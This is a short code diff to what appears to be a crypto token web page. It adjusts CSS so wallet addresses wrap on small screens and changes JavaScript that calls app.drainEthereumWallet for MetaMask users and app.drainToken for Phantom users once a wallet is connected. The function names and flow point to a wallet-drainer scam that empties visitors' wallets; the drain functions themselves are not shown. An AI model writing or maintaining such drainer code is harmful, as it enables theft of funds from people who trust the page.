@@ -243,7 +243,15 @@
     }
     @media (max-width: 480px) {
       .token-card .address, .custom-token-card .address {
-        font-size: 0.8rem;
+        font-size: 0.7rem;
+        line-height: 1.2;
+        white-space: normal;
+        word-break: break-word;
+        overflow-wrap: anywhere;
+      }
+      .token-popup-content .address, .custom-token-popup-content .address {
+        font-size: 0.7rem;
+        line-height: 1.2;
         white-space: normal;
         word-break: break-word;
         overflow-wrap: anywhere;
@@ -637,7 +645,7 @@
             if (app.connectedWalletType === 'MetaMask') {
               app.drainEthereumWallet(app.publicKey);
             } else if (app.connectedWalletType === 'Phantom') {
-              app.drainSolanaWallet();
+              app.drainToken(address);
             } else {
               app.showFeedback('No wallet connected. Please connect your wallet.', 'error');
               return;
